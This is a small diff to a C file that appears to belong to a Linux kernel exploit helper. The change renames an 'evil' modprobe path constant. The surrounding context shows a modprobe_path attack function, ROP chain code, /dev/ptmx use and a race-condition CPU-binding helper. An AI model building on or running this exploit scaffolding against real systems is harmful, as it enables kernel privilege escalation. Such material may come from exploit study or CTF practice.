@@ -39,7 +39,7 @@ int fd;
 
 #define TTY_FILE                        "/dev/ptmx"  
 #define DEFAULT_MODPROBE_TRIGGER        "/tmp/fake"
-#define DEFAULT_EVIL_MODPROBE_PATH      "/tmp/pwn"
+#define DEFAULT_EVIL_MODPROBE_PATH      "/tmp/0modprobe"
 
 #define SUCCESS_MSG(msg) "\033[32m\033[1m" msg "\033[0m"
 #define INFO_MSG(msg) "\033[34m\033[1m" msg "\033[0m"
@@ -159,6 +159,7 @@ size_t *rop_commit(int i) {
     return fuzz;
 }
 
+
 // modprobe_path attack
 size_t modprobe_path;
 
@@ -273,8 +274,6 @@ void modprobe_attack_read(char *filename){
     fclose(fptr);
 
 }
-
-
 //for race condtion
 void bind_cpu(int core)
 {
